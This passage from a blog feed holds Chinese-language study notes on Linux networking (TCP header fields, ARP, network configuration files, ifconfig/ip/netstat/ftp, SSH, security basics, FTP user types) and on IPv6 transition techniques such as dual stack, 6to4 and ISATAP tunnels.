/><ol><li>源端口和目标端口(Source Port&amp;Destinaton Port):传送/接收数据使用的端口。</li><li>数据包序号(Sequence Number)：数据包过大而进行分段后，记录数据包序号，接收方可以组合成功</li><li>回应序号 (Acknowledge Number):为了确认接收端收到发送端所送出的数据包数据,发送端希望能吸收到接收端的响应。</li><li><strong>数据补偿（Data Offset):补偿位。</strong></li><li>保留位（Reserved ):未使用的保留字段。</li><li>控制标志码（Control Flag):当进行网络连接时，必须说明这个联机的状态，使接收端了解这个数据包的主要动作。这个子段为6bits，分别代表6个句柄，若为1则为启动。说明如下所示。<ul><li> URG （Urgent)）: 为1表示该数据包为紧急数据包，接收端应该紧急处理。</li><li>ACK (Acknowledge):为1表示这个数据包为确认数据包，与Acknowledge Number有关</li><li>PSH (Push function):为1表示要求对方立即传送缓冲区内的其他对应数据包，而无须等待缓冲区满。</li><li>RST （Reset):为1表示联机会马上结束，而无须等待终止确认手续。这是个强制结束的联机,且发送端已断线。</li><li>SYN (Svnchronous):为1表示发送端希望双方建立同步处理，即要求建立联机。通常带有SYN标志的数据包表示“主动”要连接到对方的意思。</li></ul></li><li><strong>滑动窗口</strong>（Window):用于控制数据包的流量，可以告知对方目前有多少缓冲区容量(Receive Buffer)可以接收数据包。当Window=0时，表示缓冲器已经额满。</li><li><strong>确认校验码</strong>（Checksum);数据由发送端送出前会进行一个检验的动作，并将该动作的检验值标注在这个字段上。而接收者收到这个数据包之后，会再次对数据包进行验证，并且与原来发送的确认校验码值进行对比,如果相符就接收，若不符就认为该数据包已经损毁，要求对方</li><li><strong>紧急信息</strong> （Urgent Pointer ):该字段在 Code字段内的URG值为1时才会产生作用，告知紧急数据所在的位置。</li><li>任意资料（Options）</li></ol><h4 id="P220-ARP-RARP概念"><a href="#P220-ARP-RARP概念" class="headerlink" title="P220: ARP/RARP概念"></a>P220: ARP/RARP概念</h4><p>任何一台主机（确切的说是任何一个网络适配器）在物理上唯一的标识是48bit适配器的地址，即MAC地址 ( Media Access Controladdress)。这个地址保存在网络适配器的ROM中，是不能修改的。在实际应用中,田户可 以为任意一个网络适配器指定不同的IP地址。</p><p>MAC地址是所有网络活动的基础,但是网上的主机之间的通信是通过IP地址讲行的,因此在这个过程中就存在一个转换，即MAC地址与IP地址的对应，实现这一地址解析的协议为ARP(地址解析协议）和RARP（逆地址解析协议）。</p><ul><li>ARP为IP地址到对应的硬件MAC 地址之间提供动态映射，这个过程是自动完成的,一般应用程序或系统管理员不必操作中间流程。</li><li>RARP用于那些没有磁盘驱动器的系统（一般是无盘工作站或X终端)，它需要系统管理员进行手工设置，提供MAC地址到IP地址的解析。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221237222.png" alt="image-20230212221237222" style="zoom: 80%;" /><h4 id="P225-227-网络配置文件"><a href="#P225-227-网络配置文件" class="headerlink" title="P225-227: 网络配置文件"></a>P225-227: 网络配置文件</h4><p>Ubuntu Linux为适应不同需求，在进行网络访问时，需要配置网络配置文件，这些配置文件位于”/etc“目录下。</p><p><strong>1./etc/network/interfaces网络基本信息配置文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">cat</span> /etc/network/interfaces//lo接口的配置信息<span class="token number">1</span> auto lo //系统开机时，自动启动lo接口<span class="token number">2</span> iface lo inet loopback //设置lo接口的地址信息，此处设置为本地回环<span class="token punctuation">(</span>loopback<span class="token punctuation">)</span><span class="token number">3</span>//系统中一块网卡eth0接口的配置信息//一个网卡对应一个地址的基本配置方法：<span class="token number">4</span> auto eth0 //系统开机时，自动启动eth0接口，该接口为系统默认的第一块网卡所在的接口<span class="token number">5</span> iface eth0 inet dhcp //设置eth0接口的地址信息，此处设置为动态自动获取<span class="token punctuation">(</span>dhcp<span class="token punctuation">)</span><span class="token number">6</span> address <span class="token number">192.168</span>.1.21 //设置eth0接口的一个静态IP地址为192.168.1.21<span class="token number">7</span> netmask <span class="token number">255.255</span>.255.0 //设置eth0接口的子网掩码为255.255.255.0<span class="token number">8</span> gateway <span class="token number">192.168</span>.1.1 //设置eth0接口的静态网关地址为192.168.1.1//同一个物理网卡设备上有多个地址的基本配置方法：<span class="token number">11</span> auto eth0 eth0:1<span class="token number">12</span> iface eth0 inet static<span class="token number">13</span> address <span class="token number">192.168</span>.1.100<span class="token number">14</span> netmask <span class="token number">255.255</span>.255.0<span class="token number">15</span> gateway <span class="token number">192.168</span>.1.1 <span class="token number">16</span> iface eth0:1 inet static<span class="token number">17</span> address <span class="token number">192.168</span>.1.200<span class="token number">18</span> netmask <span class="token number">255.255</span>.255.0<span class="token number">19</span> gateway <span class="token number">192.168</span>.1.1 //不同接口上配置多个网卡的基本配置方法：<span class="token number">21</span> auto eth0 eth1<span class="token number">22</span> iface eth0 inet static<span class="token number">23</span> address <span class="token number">192.168</span>.0.125<span class="token number">24</span> netmask <span class="token number">255.255</span>.255.0<span class="token number">25</span> gateway <span class="token number">192.168</span>.1.1 <span class="token number">26</span> iface eth1 inet static<span class="token number">27</span> address <span class="token number">192.168</span>.0.137<span class="token number">28</span> netmask <span class="token number">255.255</span>.255.0<span class="token number">29</span> gateway <span class="token number">192.168</span>.1.1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(auto lo)</p><p><strong>2.其他网络相关配置文件</strong></p><p>（考基本的端口号）</p><ul><li><p>/etc/hosts 主机名映射文件</p><p>在网络上实现域名和IP地址的映射的两种方法：大量域名解析采用DNS服务器，小型网络可使用/etc/hosts文件提供解析。文件包含部分常用IP地址和主机名/主机名别名之间的映射</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;文件种没有tom主机信息，因此会登陆失败。添加tom记录：$ sudo vim &#x2F;etc&#x2F;hosts127.0.0.1 localhost127.0.1.1 abc &#x2F;&#x2F;当前用户192.168.1.93 netservice.webservice.bamms.com tom&#x2F;&#x2F;登录主机$ftp tom<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/host.conf 配置名称解析器</p><pre class="line-numbers language-none"><code class="language-none">$ cat &#x2F;etc&#x2F;host.conforder hosts,bindmulti on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>”order”指定主机名查询顺序，其参数用逗号隔开的查找方法。支持的查找方法为bind和hosts，分别代表DNS、/etc/hosts，此处规定先查询/etc/hosts文件，然后再使用DNS来解析域名</p></li><li><p><font color=Brown><strong>/etc/services 端口映射文件</strong></font></p><p>(判断)</p><pre class="line-numbers language-none"><code class="language-none">ftp-data 20&#x2F;tcpftp 21&#x2F;tcpfsp 21&#x2F;udp  fspdssh 22&#x2F;tcptelnet 23&#x2F;tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>/etc/resolv.conf 配置DNS客户</p></li></ul><h4 id="P228-P233-常用网络管理工具"><a href="#P228-P233-常用网络管理工具" class="headerlink" title="P228-P233: 常用网络管理工具"></a>P228-P233: 常用网络管理工具</h4><ul><li><p><strong>ifconfig 配置网络地址信息</strong></p><p>显示或临时配置当前主机某张网卡的IP地址。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0<span class="token punctuation">(</span>网卡<span class="token punctuation">)</span> <span class="token function">ifconfig</span> eth0 //查看eth0的网络情况<span class="token function">ifconfig</span> eth0 up/down //激活或关闭eth0<span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.0.25 netmask <span class="token number">255.255</span>.255.0 //设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>nslookup 域名解析测试</strong></p><p>查询一台机器的IP地址和其对应的域名，使用权限为所有用户，它一般需要一台域名服务器来提供域名服务。“&gt;”后输入查询IP地址，“exit”退出。</p></li><li><p><strong>ping 测试网络状态</strong></p><p>测试网络是否可达。“Time out”主机不可达，若数据包丢失严重则说明网络很不稳定。</p><pre class="line-numbers language-none"><code class="language-none">ping www.baidu.com -c 3 &#x2F;&#x2F;发送三个数据包来测试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ip 网络配置工具</p><p>ip [options] object [ command [arguments] ]</p><ul><li><p>options参数</p><ul><li>-v 打印iproute信息</li><li>-r 将ip地址转换成域名</li><li>-s 输出详细结果</li></ul></li><li><p>object 管理对象</p><ul><li>Link 网络接口设备，通常网卡</li><li>Address IP地址</li><li>Neighbour ARP记录</li><li>Rule 路由策略</li></ul><p>……</p></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">ip</span> addr <span class="token function">add</span> <span class="token number">192.168</span>.44.122 dev eth0 //添加IP地址到eth0网卡上<span class="token function">sudo</span> <span class="token function">ip</span> rule <span class="token function">add</span> from <span class="token number">192.168</span>.0.25 prio <span class="token number">32777</span> reject //丢弃源地址属于192.168.0.25网络的所有数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>netstat</strong></p><p>用来显示活动的TCP连接、计算机侦听端口、以太网统计信息、IP路由表、IPv4统计信息(IP,ICMP,TCP,UDP)以及IPv6统计信息(TCP,UDP)。</p><ul><li>-a  所有</li><li>-e 以太网的统计信息</li><li>-n 活动的TCP连接，数字形式</li><li>-o 活动的TCP连接</li><li>-p 协议</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -p -tcp //查看tcp协议类型的连接<span class="token function">netstat</span> -p -tcp -udp //仅显示TCP和UDP协议的统计信息<span class="token function">netstat</span> -o <span class="token number">5</span> //每5秒显示一次活动的TCP连接和进程ID<span class="token function">netstat</span> -n Co //以数字形式显示活动的TCP连接和进程ID<span class="token function">netstat</span> -e -s //显示以太网统计信息和所有协议的统计信息<span class="token function">netstat</span> -a //显示处于监听状态的所有端口neystat -ln //显示当前主机监听的所有端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>ftp 访问命令</strong></p><p>用来进行远程文件传输。是标准的文件传输协议的用户接口，是TCP/IP网络计算机之间传输文件的简单有效的方法，允许传输ASCII和二进制文件。</p><p>ftp [-dignv] [主机名称IP地址]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ftp<span class="token operator">></span>命令<span class="token function">ls</span> //列出远程机的当前目录<span class="token builtin class-name">cd</span> //在远程机上改变工作目录lcd //在本地机上改变工作目录close //终止当前的ftp会话<span class="token builtin class-name">hash</span> //每次传输完数据缓冲区中的数据后就显示一个<span class="token comment">#号</span>get <span class="token punctuation">(</span>mget<span class="token punctuation">)</span> //从远程机传送指定文件到本地机put <span class="token punctuation">(</span>mput<span class="token punctuation">)</span> //从本地机传送指定文件到远程机quit //断开与远程机的连接，并退出ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>route 路由设置</p></li></ul><h4 id="P250：SSH服务使用"><a href="#P250：SSH服务使用" class="headerlink" title="P250：SSH服务使用"></a>P250：SSH服务使用</h4><p>SSH远程登录，端口号22</p><p><strong>安装SSH软件包</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps3.jpg" alt="img" style="zoom: 67%;" /> </center>启动服务，使用netstat监听ssh服务状态<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps4.jpg" alt="img" style="zoom:67%;" /> </center>打开命令行输入ssh **用户@ip**进行远程连接<center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps5.jpg" alt="img" style="zoom: 50%;" /> </center>#### P255: 信息安全基础<p>例：什么是数字签名，什么是网络攻击，网络传输特性，是否具有保密性，什么是安全性</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/D1D3D1E4122B157885510E5764E3F031.jpg" alt="img" style="zoom: 25%;" /><p>网络攻击：</p><ul><li>中断：正在传输的信息被中止。</li><li>截获：在传输的过程中被其他窃听者获取敏感信息。</li><li>修改：正在传输的信息被其他人修改后再发送给接收方。</li><li>捏造：网络上的其他非法用户以真实用户的名义发送虚假信息。</li></ul><p>网络传输特性：</p><ul><li>Integrity（完整性):实现数据完整地传输给对方，即在传输的过程中不被修改。</li><li>Confidentiality（保密性):保证信息在传输的过程中不被其他人窃听获取。</li><li>Availability（可用性):网络上的服务器可以实时被利用。</li></ul><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212223644220.png" alt="image-20230212223644220" style="zoom:50%;" /><p>加密方式：</p><ul><li><p>对称加密（单钥）</p><ul><li>同一个密钥去加密和解密数据。发送方在发送信息前使用密钥（只有发送方和接收方知道）对数据进行加密，然后传输密文给接收方，接收方使用同样的密钥来解密密文，得到明文信息。</li><li>好处：算法成熟，易于实现；弊端：密钥管理</li><li>DES, 3DES, AES</li></ul></li><li><p>非对称加密（双钥）</p><ul><li>发送方在发送信息前使用接收方的公钥（所有人都知道）进行加密，然后传输密文给接收方，接收方使用自己的私钥（只有接收方自己知道）来解密密文，得到明文信息。</li><li>好处：不进行密钥传输，降低密钥管理风险；弊端：算法实现难度，速度慢</li><li>背包算法，RSA</li></ul><p>一般使用非对称方式加密密钥进行数据传输，使用传递的密钥来加密数据。</p></li></ul><p>数字签名：</p><p>解决问题：发送方否认问题，即发送方否认发送过某一信息；接收方否认问题，即接收方否认接收到某个消息</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212224831381.png" alt="image-20230212224831381" style="zoom: 50%;" /><ul><li><p>消息加密:整个消息的密文作为认证符。</p></li><li><p>消息认证码:MAC消息和密钥的公开函数，产生定长的值作为认证符。</p></li><li><p>Hash 函数:将任意长的消息映射为定长的 hash值的公开函数，以该hash值作为认证符。目前主要使用的数字签名算法有以下几种:</p></li><li><p>RSA算法:是目前应用最广泛的数字签名，Linux 下的 OpenSSH 中即使用这一算法。DSA (Digital Signature Algorithm）算法:基于有限域上的离散对数问题即 DSS（数字签名标准)。</p></li><li><p>GOST 算法:俄罗斯采用的数字签名标准算法。</p></li></ul><h4 id="P266-FTP"><a href="#P266-FTP" class="headerlink" title="P266: FTP"></a>P266: FTP</h4><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps2.jpg" alt="img" style="zoom: 50%;" /> </center>**主要功能：**<ol><li>不同等级的使用者。<ul><li>实体账号 real user</li><li>访客 guest</li><li>匿名登录者 anonymous</li></ul></li><li>命令记录与登录文件记录</li><li>限制或解除使用者所在的根目录。（提高安全性）</li></ol><p><strong>用户分类：</strong></p><ul><li>实体用户(Real user)。系统本机用户。Linux系统一般不会针对实体用户进行限制，因此用户可以针对整个文件系统进行所有的工作。这是非常危险的，为禁止系统使用的账号登录，管理员可以在文件/etc/ftpusrs中设定不允许登录的账号，如root是不允许登录FTP的。</li><li>访客(Guest)。访客用户。只能进行文件传输的用户，即虚拟用户，访问服务器时仍然需要验证。</li><li>匿名者(anonymous)。对于公共性质的服务器可以提供匿名用户访问（一般服务器很少使用)，但应对其进行尽可能多的限制，包括以下一些内容。<ul><li>允许的工作指令要减少很多。</li><li>限制文件传输的数量,尽量不要允许其上传数据。</li><li>设置匿名者同时登录的最大联机数量。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt;&lt;center&gt;Linux 知识点汇总&lt;/center&gt;&lt;/h2&gt;
[TOC]

&lt;h4 id=&quot;P4-Linux的基本特征-8个&quot;&gt;&lt;a href=&quot;#P4-Linux的基本特征-8个&quot; class=&quot;headerlink&quot; title=&quot;P4: Linux的基本特征 </summary>
      
    
    
    
    <category term="学习笔记" scheme="https://shierjinghuang.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="https://shierjinghuang.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>IPv6过渡技术</title>
    <link href="https://shierjinghuang.github.io/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/"/>
    <id>https://shierjinghuang.github.io/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/</id>
    <published>2022-12-24T04:56:13.000Z</published>
    <updated>2023-03-12T01:12:01.356Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a>IPv6过渡技术</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 理解使用隧道机制实现IPv6穿越IPv4的原理</span><span class="token comment"># 掌握6to4自动隧道、ISATAP自动隧道的实现机制</span><span class="token comment"># 掌握Win 7下配置6to4路由器、ISATAP路由器的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>[TOC]</p><h3 id="IPv6过渡技术概述"><a href="#IPv6过渡技术概述" class="headerlink" title="IPv6过渡技术概述"></a>IPv6过渡技术概述</h3><h4 id="IPv6过渡期的特点"><a href="#IPv6过渡期的特点" class="headerlink" title="IPv6过渡期的特点"></a>IPv6过渡期的特点</h4><ul><li>协议的过渡需要在网络中的所有节点上安装和配置新的协议，并且检验所有主机和路由器都能正确运行</li><li>要实施IPv6网络，必须充分考虑现有的网络条件，充分利用现有的条件构造下一代互联网，以避免过多的浪费</li></ul><h4 id="过渡时期采用技术的选择"><a href="#过渡时期采用技术的选择" class="headerlink" title="过渡时期采用技术的选择"></a>过渡时期采用技术的选择</h4><p><strong>双栈技术(Dual Stack)</strong></p><ul><li>让IPv4和IPv6共存于同一设备和网络中(RFC 2893)，采用该技术的节点上同时运行IPv4和IPv6两套协议栈</li><li>对IPv4和IPv6提供了完全的兼容，但对于IP地址耗尽问题没有任何帮助</li></ul><p><strong>隧道技术(Tunnel)</strong></p><ul><li>可以让IPv6业务在现有IPv4基础设施上传输(RFC2473、RFC2893、RFC3056)。将IPv6分组作为无结构的数据，封装在IPv4数据报中，被IPv4网络传输</li><li>隧道分为手工配置的隧道和自动配置的隧道</li><li>它不能解决IPv6节点和IPv4节点之间的相互通信问题</li></ul><p><strong>转换(翻译)技术</strong></p><ul><li>让纯IPv6节点能够和纯IPv4节点相互通信(RFC2766)</li><li>转换网关除了要进行IPv4和IPv6地址转换之外，还要进行协议的转换和翻译。</li></ul><h3 id="兼容的地址"><a href="#兼容的地址" class="headerlink" title="兼容的地址"></a>兼容的地址</h3><ol><li>IPv4兼容地址<ul><li>格式为:0:0:0:0:0:0:w.x.y.z:w或::w.x.y.z，(其中w.x.y.z是公共IPv4地址的点缀十进制表示)，用于IPv6/IPv4节点，它使IPv4/IPv6节点可以通过IPv4网络与IPv6节点进行通信</li><li>如果IPv6通信流的目的地址是IPv4兼容地址，则IPv6通信流会被IPv4报头自动封装，并通过IPv4网络发送到目标节点</li></ul></li><li>IPv4映射地址<ul><li>格式为:0:0:0:0:0:0:FFFF:w.x.y.z或::FFFF:w.x.y.z，用于将一个IPv4-only节点表示为一个IPv6节点，它仅用于内部表示</li><li>IPv4映射地址从不用作IPv6数据包的源地址或目的地址，主要用于一些在IPv4-only节点和IPv6-only节点间进行协议转换的实现方案中</li></ul></li><li>6over4地址</li></ol><ul><li>6over4地址由一个有效的64位单播地址前缀和接口标识符::WWXX:YYZZ组成(其中WWXX:YYZZ是接口的单播IPv41地J止w.X.y.2HJS1 八长示)</li><li>当使用RFC2529中定义的自动隧道机制时，系统会将6over4地址分配给一个连接到支持多播IPv4网络结构中的IPv6节点</li></ul><ol start="4"><li>6to4地址<ul><li>6to4地址基于前缀2002:WWXX:YYZZ::/48(其中WWXX:YYZZ是公共IPv4地址w.x.y.z的冒号十六进制表示)</li><li>当使用RFC3056中定义的自动隧道机制时，6to4地址前缀用于创建站点的全球地址前缀，以及站点中的IPv6节点的全球地址</li></ul></li><li>ISATAP地址<ul><li>ISATAP(Intra-Site Automatic Tunnel Addressing Protocol)地址由一个有效的64位IPv4单播地址前缀和接口标符::5EFE:w.x.y.z所组成(其中w.x.y.z是一个接口的单播IPv4地址)</li><li>当使用RFC5214中定义的自动隧迫礼制时，系统会将使用ISATAP接口标识符的地址分配给IPv6/IPv4节点</li></ul></li></ol><h3 id="双栈技术"><a href="#双栈技术" class="headerlink" title="双栈技术"></a>双栈技术</h3><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>即主机和路由器在同一网络接口上运行IPv4栈和IPv6栈。这样，双栈节点既可以接收和发送IPv4包和IPv6包，因而两个协议可以在同一网络中共存</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6双栈技术示意图.png" style="zoom:67%;" /><h4 id="三种工作模式"><a href="#三种工作模式" class="headerlink" title="三种工作模式"></a>三种工作模式</h4><ul><li>只运行IPv6协议，对外呈现为IPv6节点;</li><li>只运行IPv4协议，对外呈现为IPv4节点;</li><li>同时运行IPv4协议和IPv6协议，对外呈现双栈模式。</li></ul><p>支持三种隧道模式为：不运行隧道；仅运行手工隧道；同时运行手工和自动隧道。</p><h4 id="双栈技术的特点"><a href="#双栈技术的特点" class="headerlink" title="双栈技术的特点"></a>双栈技术的特点</h4><blockquote><p>双栈技术是一切过渡技术的基础，隧道机制和翻译机制都要利用双栈节点</p></blockquote><ul><li>双栈技术应该能独立的配置IPv4和IPv6地址</li></ul><p>双栈技术的优点是互通性好，易于理解；缺点是需要给每个新的运行IPv6协议的网络设备和终端分配IPv4地址，不能解决IPv4地址短缺问题</p><h3 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h3><blockquote><p>隧道(Tunnel)是指将一种协议首部封装在另一种协议首部中，使得一种协议可以通过另一种协议的封装进行通信</p></blockquote><ul><li>优点在于隧道的透明性，不需要大量的IPv6专用设备和链路，可以明显的减少投资</li><li>缺点是配置麻烦，不能实现纯IPv4和纯IPv6主机之间的通信。</li></ul><h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><ul><li>核心思想是通过把IPv6数据报文封装入IPv4数据报文中，让现有IPv4网络成为载体以建立IPv6的通信，隧道两端的节点间数据报文的传送通过IPv4机制进行，隧道被看成一个直接连接的通道</li><li>隧道有两个端点，隧道入口点和隧道出口点。在入口点，路由器将IPv6分组封装在IPv4中，该IPv4的源地址和目的地址分别是入口和出口的IPv4地址。在出口点将IPv6分组取出转发给目的站点</li></ul><h4 id="IPv6数据包的封装步骤"><a href="#IPv6数据包的封装步骤" class="headerlink" title="IPv6数据包的封装步骤"></a>IPv6数据包的封装步骤</h4><ul><li>入口点将IPv6跳数限制减去1，并把该数据包封装进某个IPv4首部中。IPv4首部“协议”域设置为”41”，指示这个分组的净荷是一个IPv6的分组</li><li>通过隧道传输封装后的数据包，如果必要，封装后的IPv4数据包进行分段</li><li>隧道出口点接收到封装后的数据包。如果数据包被分段，出口点进行重组</li><li>出口点剥离IPv4首部，将IPv6数据包传递到目的地址</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6数据包封装.png" style="zoom:67%;" /><h4 id="隧道的实现方式"><a href="#隧道的实现方式" class="headerlink" title="隧道的实现方式"></a>隧道的实现方式</h4><ul><li><p>为了让数据通过隧道，必须知道两个端点的地址。确定入口点的是直接的因为它出现在IPv4基础结构的边界;确定隧道的出口点要复杂些</p></li><li><p>根据隧道终点地址的获得方式可将隧道分为<strong>配置隧道</strong>和<strong>自动隧道</strong>，其中配置隧道主要用于路由器到路由器</p></li><li><p>自动隧道有以下几种方式:</p><ul><li>Tunnel Brokers(RFC 3053):基于服务器的半自动隧道;</li><li>6to4(RFC 3056):路由器到路由器;</li><li>ISATAP:主机到路由器，路由器到主机，也可以主机到主机;.</li><li>6over4(RFC 2529):主机到路由器，路由器到主机;</li><li>Teredo:通过IPv4 NAT建立隧道;</li></ul></li></ul><h5 id="过渡初期"><a href="#过渡初期" class="headerlink" title="过渡初期"></a>过渡初期</h5><ul><li>使IPv6报文在IPv4网络中传输。手动隧道包括IPv6 over lPv4隧道，自动隧道包括IPv4兼容IPv6自动隧道、6to4隧道和ISATAP隧道</li></ul><h5 id="过渡后期"><a href="#过渡后期" class="headerlink" title="过渡后期"></a>过渡后期</h5><ul><li>使用IPv4 over lPv6隧道，使IPv4报文在lPv6网络中传输。</li></ul><h4 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h4><ul><li>需要隧道两个端点所在网络的管理员协作完成</li><li>隧道的端点地址由配置来决定，不需要为站点分配特殊的IPv6地址</li><li>适用于经常通信的IPv6站点之间</li></ul><h4 id="基本的自动隧道技术"><a href="#基本的自动隧道技术" class="headerlink" title="基本的自动隧道技术"></a>基本的自动隧道技术</h4><ul><li>自动配置的隧道<ul><li>端点地址根据分组的目的地址确定，适用于单独的主机之间或者不经常通信的站点之间。需要站点使用IPv4兼容的IPv6地址(O::IPv4/96)，且站点之间有可用的IPv4连接，每个采用这种机制的主机都需要一个IPv4地址</li><li>不能解决IPv4地址空间耗尽的问题。两个端点都必须支持双协议栈</li></ul></li></ul><h5 id="IPv4多播隧道6-over-4"><a href="#IPv4多播隧道6-over-4" class="headerlink" title="IPv4多播隧道6 over 4"></a>IPv4多播隧道6 over 4</h5><ul><li>与配置隧道不同的是它不需要任何地址配置;与自动隧道不同的是它不要求使用lIPv4兼容的IPv6地址</li><li>当通过支持6 over 4的路由器与外界相连时，站点内的主机可以和外部IPv6站点通信</li></ul><h4 id="6to4隧道"><a href="#6to4隧道" class="headerlink" title="6to4隧道"></a>6to4隧道</h4><blockquote><p>6to4是一种自动隧道机制，通常在站点的边界路由器之间建立隧道，它为IPv6站点和主机之间提供了跨IPv4 Internet的单播IPv6连通性</p></blockquote><p><strong>使用前缀为2002:IPv4addr:/48的6to4地址，其中IPv4addr是站点边界路由器的IPv4地址</strong></p><ul><li>当两个站点中任两台主机通信时，隧道首节点自动从IPv6源地址和目的地址中提取出隧道首尾节点的IPv4地址，在两个站点的边界路由器之间建立一条IPv4隧道</li></ul><p>隧道不需要维护任何信息，通信开始时建立，通信结束时自动撤销</p><h5 id="6to4路由器"><a href="#6to4路由器" class="headerlink" title="6to4路由器"></a>6to4路由器</h5><blockquote><p>6to4路由器是支持使用6to4隧道接口的IPv6/IPv4路由器，它通常用于一个站点中的6to4主机和IPv4网络(如: Internet)上的其它6to4路由器或6to4中继路由器之间转发目标为6to4地址的通信流，充当了隧道的端点</p></blockquote><p>6to4路由器应实现双栈和6to4隧道功能，并且至少有一个全球唯一的可路由IPv4地址需要使用额外的处理逻辑，以正确地封装和拆封，并且还可能需要额外的手工配置</p><h5 id="6to4中继路由器"><a href="#6to4中继路由器" class="headerlink" title="6to4中继路由器"></a>6to4中继路由器</h5><ul><li>在Internet上的6to4路由器和IPv6 Internet上的主机之间转发目标为6to4地址的通信流的IPv6/IPv4路由器</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/6to4中继路由器.png" style="zoom:67%;" /><h4 id="lSATAP隧道"><a href="#lSATAP隧道" class="headerlink" title="lSATAP隧道"></a>lSATAP隧道</h4><blockquote><p>站点内自动隧道寻址协议(Intra-Site Automatic Tunnel AddressingProtocol)，将没有IPv6路由器的IPv4内部网中的IPv6节点连接起来，为IPv6主机之间提供了<strong>跨越IPv4内部网络</strong>单播IPv6连通性</p></blockquote><ul><li>ISATAP主机使用标准地址自动配置机制来创建lSATAP地址。ISATAP地址格式为:64位前缀:5EFE: w.x.y.z。其中前缀可以是链路本地地址前缀、站点本地前缀和全球前缀(包括6to4前缀)</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/ISATAP隧道.png" style="zoom:67%;" /><h3 id="协议转换技术"><a href="#协议转换技术" class="headerlink" title="协议转换技术"></a>协议转换技术</h3><h4 id="NAT技术"><a href="#NAT技术" class="headerlink" title="NAT技术"></a>NAT技术</h4><ul><li>NAT有三种类型:静态NAT;动态NAT;网络地址端口转换NAPT</li><li>对于IPv4向IPv6过渡机制来讲，这里的内网和外网可以分别对应IPv4网络或IPv6网络</li><li>NAT网关使用一个IPv4地址池，并把这些地址和相应IPv6地址绑定在一起。不需要对终端节点做任何修改</li><li>转换技术依据转换所对应计算机网络体系结构的层次。缺点是不支持lPv6高级特性，例如端到端的安全</li></ul><h3 id="过渡机制的选择"><a href="#过渡机制的选择" class="headerlink" title="过渡机制的选择"></a>过渡机制的选择</h3><p>在现有的IPv4网络上逐步融合IPv6技术，过渡的内容包括:</p><blockquote><p>网络的过渡；主机节点的过渡；应用程序的过渡；IPv4网络与IPv6网络之间的互通；IPv6网络之间的互通</p></blockquote><h4 id="lPv6过渡时期建议采用的过渡原则"><a href="#lPv6过渡时期建议采用的过渡原则" class="headerlink" 